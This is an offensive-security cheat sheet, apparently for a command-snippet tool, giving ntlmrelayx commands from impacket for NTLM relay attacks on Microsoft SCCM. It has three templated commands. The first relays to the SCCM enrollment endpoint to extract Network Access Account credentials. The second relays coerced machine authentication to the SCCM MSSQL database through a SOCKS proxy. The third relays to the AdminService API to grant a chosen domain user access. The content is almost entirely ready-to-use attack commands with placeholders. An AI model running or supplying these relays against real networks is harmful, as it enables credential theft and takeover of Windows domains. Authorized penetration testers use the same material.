# ntlmrelayx (imp)

% impacket-mitm, windows, smb, 445, sccm

#plateform/linux  #target/remote #cat/ATTACK/RELAY


## relay to sccm (NAA extraction)
#plateform/linux #target/serve #cat/ATTACK/MITM 
https://github.com/Tw1sm/impacket/tree/feature/sccm-relay
```bash
sudo ntlmrelayx.py -t http://<sccm_fqdn>/ccm_system_windowsauth/request --sccm --sccm-device <fake_computer|jubeaz> --sccm-fqdn <sccm_fqdn> --sccm-server <sccm_name> --sccm-sleep 10 -smb2support
```

## relay to mssql (sccm$ ooerce)
then mssqlclient.py ntlm relayed auth (computer)
```bash
sudo ntlmrelayx.py -t "mssql://<sccm_mssql_ip>" -smb2support -socks
```

## relay to adminservice (http API)
https://github.com/fortra/impacket/pull/1593
https://github.com/garrettfoster13/impacket/blob/feature/relay-sccm-adminservice/examples/ntlmrelayx.py
```bash
ntlmrelayx.py -t https://<sccm_fqdn>/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "<domain_netbios>\<user>" --displayname "<domain_netbios>\<user>" --objectsid <user_sid>
```
